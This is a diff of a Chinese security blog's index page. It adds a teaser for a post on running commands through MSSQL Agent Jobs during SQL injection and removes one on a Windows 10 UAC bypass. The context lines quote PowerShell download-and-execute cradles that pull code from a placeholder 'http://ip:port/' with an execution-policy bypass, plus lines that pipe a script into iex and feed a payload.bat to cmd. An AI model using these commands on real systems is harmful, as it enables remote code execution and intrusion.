@@ -411,6 +411,192 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Mssql_Agent_Job_Exec.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/archives/Mssql_Agent_Job_Exec.html" class="post-title-link" itemprop="url">MSSQL注入时通过Agent Job执行命令</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-10-09 07:50:00" itemprop="dateCreated datePublished" datetime="2016-10-09T07:50:00+08:00">2016-10-09</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/奇技淫巧/" itemprop="url" rel="index"><span itemprop="name">奇技淫巧</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <a href="/archives/Mssql_Agent_Job_Exec.html#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/Mssql_Agent_Job_Exec.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>
+              USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_jo
+              ...
+            </p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/archives/Mssql_Agent_Job_Exec.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    <div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/osx10-11_weak_up_fix.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
@@ -899,7 +1085,7 @@
 <h2 id="0x00-Command-和-Powershell-没被禁用，脚本被禁用"><a href="#0x00-Command-和-Powershell-没被禁用，脚本被禁用" class="headerlink" title="0x00 Command 和 Powershell 没被禁用，脚本被禁用"></a>0x00 Command 和 Powershell 没被禁用，脚本被禁用</h2><p><img src="https://evi1cg.github.io/usr/uploads/2016/12/1846475534.png" alt="1463634732723.png"></p>
 <h3 id="1、直接使用cmd-powershell执行"><a href="#1、直接使用cmd-powershell执行" class="headerlink" title="1、直接使用cmd powershell执行"></a>1、直接使用cmd powershell执行</h3><p>Powershell:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IEX</span> (New-Object Net.WebClient)<span class="selector-class">.DownloadString</span>(<span class="string">'http://ip:port/'</span>)</span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -c IEX (<span class="keyword">New</span>-Object Net.WebClient).DownloadString('http:<span class="comment">//ip:port/')</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> script.ps1 | iex</span><br></pre></td></tr></table></figure></p>
+<h3 id="2、管道"><a href="#2、管道" class="headerlink" title="2、管道"></a>2、管道</h3><p>Powershell:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content script.ps1 <span class="string">| iex</span></span><br></pre></td></tr></table></figure></p>
 <p>Command：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span>.<span class="bash">exe /K &lt; payload.bat</span></span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           
@@ -1142,190 +1328,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-      <meta itemprop="name" content="Evi1cg">
-      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
-      <meta itemprop="name" content="Evi1cg's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html" class="post-title-link" itemprop="url">BypassUac On Win10 Using Disk Cleanup</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2016-07-27 09:18:00" itemprop="dateCreated datePublished" datetime="2016-07-27T09:18:00+08:00">2016-07-27</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/技术分享/" itemprop="url" rel="index"><span itemprop="name">技术分享</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <a href="/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>最近看到enigma0x3博客上分享了一种通过Disk Cleanup计划任务进行bypassuac的姿势，感觉还是不错的，所以在这儿分享一下。原文在这里 戳我<br>关于BypassUAC工具已经很多了，有个非常不错的工具 UACME</p>
-<p>简单的说一下通过Disk Cleanup进行bypassuac的原理。</p>
-<p>Win10有一个计划任务叫做<code>SilentCleanup</code>,具体位置在<code>\Microsoft\Windows\DiskCleanup</code></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    <div>
-    
-    </div>
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-
-  
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1377,7 +1379,7 @@
                 
                   <a href="/archive">
                 
-                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-count">99</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1519,7 +1521,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">51</span>
+                      
+                    
+                    <span class="site-state-item-count">52</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
